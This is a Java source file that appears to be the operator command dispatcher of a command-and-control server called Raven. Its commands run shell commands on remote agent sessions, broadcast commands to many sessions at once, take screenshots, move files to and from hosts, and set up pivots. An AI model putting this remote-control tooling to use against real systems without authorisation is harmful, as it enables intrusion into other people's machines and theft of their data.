package com.raven.core.command;

import com.raven.core.database.TeamDatabase;
import com.raven.core.output.Logger;
import com.raven.interfaces.CLI.core.operator.OperatorCommands;
import com.raven.interfaces.CLI.core.server.ServerManager;
import com.raven.interfaces.CLI.core.session.SessionCommands;
import com.raven.interfaces.CLI.core.task.TaskCommands;
import com.raven.interfaces.CLI.core.web.WebPanelManager;
import com.raven.interfaces.CLI.module.chat.ChatManager;
import com.raven.interfaces.CLI.module.log.LogManager;
import com.raven.utils.ServerConfig;
import com.raven.utils.TerminalHelper;
import com.raven.utils.SystemHelper;
import java.util.ArrayList;
import java.util.List;

public final class CommandDispatcher {

    public enum DispatchResult {
        Handled,
        Exit,
        UpdateLastCount
    }

    private final ServerConfig Config;
    private final TeamDatabase Database;
    private final LogManager LogManager;
    private final ServerManager ServerManager;
    private final SessionCommands SessionCommands;
    private final OperatorCommands OperatorCommands;
    private final ChatManager ChatManager;
    private final WebPanelManager WebPanelManager;
    private final TaskCommands TaskCommands;

    private boolean IsTeamServerMode;

    public CommandDispatcher(ServerConfig Config, TeamDatabase Database, LogManager LogManager, ServerManager ServerManager, SessionCommands SessionCommands, OperatorCommands OperatorCommands, ChatManager ChatManager, WebPanelManager WebPanelManager, TaskCommands TaskCommands) {
        this.Config = Config;
        this.Database = Database;
        this.LogManager = LogManager;
        this.ServerManager = ServerManager;
        this.SessionCommands = SessionCommands;
        this.OperatorCommands = OperatorCommands;
        this.ChatManager = ChatManager;
        this.WebPanelManager = WebPanelManager;
        this.TaskCommands = TaskCommands;
    }

    public void SetTeamServerMode(boolean IsTeamServerMode) {
        this.IsTeamServerMode = IsTeamServerMode;
    }

    public DispatchResult Dispatch(String Command, String[] Parts) {
        switch (Command) {
            case "exit", "quit" -> {
                Logger.Debug("shutting down");
                ServerManager.Stop();
                if (WebPanelManager.IsRunning()) WebPanelManager.Stop();
                Database.Close();
                Logger.Shutdown();
                return DispatchResult.Exit;
            }
            case "help" -> OperatorCommands.ShowHelp();
            case "clean" -> {
                SystemHelper.ClearScreen();
                return DispatchResult.UpdateLastCount;
            }
            case "sessions", "agents" -> SessionCommands.ShowSessions();
            case "status" -> ServerManager.ShowStatus(Database.IsConnected() ? "connected" : "memory", Config.GetDatabaseType());
            case "stats" -> SessionCommands.ShowStats();
            case "logs" -> {
                LogManager.Show();
                return DispatchResult.UpdateLastCount;
            }
            case "tasks" -> SessionCommands.ShowTasksQueue();
            case "use" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: use <id>");
                    break;
                }
                try {
                    SessionCommands.Interactive(Integer.parseInt(Parts[1]));
                    return DispatchResult.UpdateLastCount;
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "exec" -> {
                if (!OperatorCommands.CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (Parts.length < 3) {
                    Logger.Info("usage: exec <id> <command>");
                    break;
                }
                try {
                    SessionCommands.Execute(Integer.parseInt(Parts[1]), Parts[2]);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "broadcast" -> {
                if (!OperatorCommands.CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (Parts.length < 3) {
                    Logger.Info("usage: broadcast <id,id,...|all> <command>");
                    break;
                }
                String Target = Parts[1].toLowerCase();
                String BroadcastCommand = Parts[2];
                if (Target.equals("all")) {
                    SessionCommands.BroadcastAll(BroadcastCommand);
                } else {
                    List<Integer> Ids = new ArrayList<>();
                    for (String IdString : Target.split(","))
                        try {
                            Ids.add(Integer.parseInt(IdString.trim()));
                        } catch (Exception Ignored) {}
                    if (Ids.isEmpty()) Logger.Info("no valid session IDs");
                    else SessionCommands.Broadcast(Ids, BroadcastCommand);
                }
            }
            case "kill" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: kill <id>");
                    break;
                }
                try {
                    SessionCommands.Kill(Integer.parseInt(Parts[1]));
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sysinfo", "info" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: sysinfo <id>");
                    break;
                }
                try {
                    SessionCommands.ShowSessionInfo(Integer.parseInt(Parts[1]));
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "whoami" -> {
                if (SessionCommands.GetCurrentSessionId() > 0) {
                    SessionCommands.Execute(SessionCommands.GetCurrentSessionId(), "whoami");
                } else if (Parts.length > 1) {
                    try {
                        SessionCommands.Execute(Integer.parseInt(Parts[1]), "whoami");
                    } catch (NumberFormatException Exception) {
                        Logger.Warn("invalid session ID");
                    }
                } else Logger.Info("usage: whoami <session-id>");
            }
            case "screenshot" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: screenshot <session-id>");
                    break;
                }
                try {
                    TaskCommands.Screenshot(Integer.parseInt(Parts[1]));
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "download" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: download <session-id> <remote-path>");
                    break;
                }
                try {
                    TaskCommands.Download(Integer.parseInt(Parts[1]), Parts[2]);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "upload" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: upload <session-id> <local-path> <remote-path>");
                    break;
                }
                try {
                    String[] UploadParts = Parts[2].split("\\s+", 2);
                    TaskCommands.Upload(Integer.parseInt(Parts[1]), UploadParts[0], UploadParts.length > 1 ? UploadParts[1] : "");
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sleep" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: sleep <session-id> <seconds>");
                    break;
                }
                try {
                    TaskCommands.Sleep(Integer.parseInt(Parts[1]), Parts[2]);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "pivot" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: pivot <session-id> <host:port>");
                    break;
                }
                try {
                    TaskCommands.RegisterPivot(Integer.parseInt(Parts[1]), Parts[2]);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "history" -> {
                int SessionId = Parts.length > 1 ? TaskCommands.ParseIntSafe(Parts[1], 0) : 0;
                int Limit = Parts.length > 2 ? TaskCommands.ParseIntSafe(Parts[2], 50) : 50;
                TaskCommands.ShowCommandHistory(SessionId, Limit);
            }
            case "note" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: note <session-id> <text>");
                    break;
                }
                try {
                    TaskCommands.SetNote(Integer.parseInt(Parts[1]), Parts[2]);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "getnote" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: getnote <session-id>");
                    break;
                }
                try {
                    TaskCommands.GetNote(Integer.parseInt(Parts[1]));
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "listopt", "listoperators" -> OperatorCommands.ShowOperators();
            case "addopt", "addoperator" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: addopt <user> <pass> [SUPER|ADMIN|OPERATOR|MEMBER]");
                    break;
                }
                String[] Tokens = Parts[2].split("\\s+", 2);
                String Password = Tokens[0];
                String RoleName = Tokens.length > 1 ? Tokens[1] : "OPERATOR";
                OperatorCommands.AddOperator(Parts[1], Password, RoleName, Config.GetAdminUsername());
            }
            case "delopt", "deleteoperator" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: delopt <username>");
                    break;
                }
                OperatorCommands.DeleteOperator(Parts[1], Config.GetAdminUsername());
            }
            case "kick", "kickopt" -> {
                if (Parts.length < 2) {
                    Logger.Info("usage: kick <username>");
                    break;
                }
                OperatorCommands.KickOperator(Parts[1], Config.GetAdminUsername());
            }
            case "setrole", "changerole" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: setrole <user> <SUPER|ADMIN|OPERATOR|MEMBER>");
                    break;
                }
                OperatorCommands.SetRole(Parts[1], Parts[2], Config.GetAdminUsername());
            }
            case "passwd", "changepassword" -> {
                if (Parts.length < 3) {
                    Logger.Info("usage: passwd <user> <newpass>");
                    break;
                }
                OperatorCommands.ChangePassword(Parts[1], Parts[2]);
            }
            case "chat" -> ChatManager.ShowLocalMessages();
            case "chathistory", "chatlog" -> ChatManager.ShowDatabaseHistory();
            case "ch" -> {
                if (!IsTeamServerMode) {
                    Logger.Warn("not in team mode");
                    break;
                }
                if (Parts.length < 3) {
                    Logger.Info("usage: ch <recipient> <message>");
                    break;
                }
                ChatManager.Send(Parts[1], Parts[2]);
            }
            case "gc" -> {
                if (!IsTeamServerMode) {
                    Logger.Warn("not in team mode");
                    break;
                }
                if (Parts.length < 3) {
                    Logger.Info("usage: gc <all|name1,name2,...> <message>");
                    break;
                }
                String Target = Parts[1].toLowerCase();
                String Message = Parts[2];
                if (Target.equals("all")) {
                    ChatManager.Send("all", Message);
                } else {
                    for (String Name : Target.split(",")) {
                        String Trimmed = Name.trim();
                        if (!Trimmed.isEmpty()) ChatManager.Send(Trimmed, Message);
                    }
                }
            }
            case "webstart" -> {
                String WebHost = Parts.length > 1 ? Parts[1] : Config.GetWebHost();
                int WebPort = Parts.length > 2 ? TaskCommands.ParseIntSafe(Parts[2], Config.GetWebPort()) : Config.GetWebPort();
                WebPanelManager.Start(WebHost, WebPort, ServerManager.GetServer(), ServerManager.GetServerStartTime());
            }
            case "webstop" -> WebPanelManager.Stop();
            case "webstatus" -> WebPanelManager.ShowStatus();
            default -> {
                Logger.Error("Unknown command: " + Command);
                Logger.Info("type 'help' for available commands");
            }
        }
        return DispatchResult.Handled;
    }
}
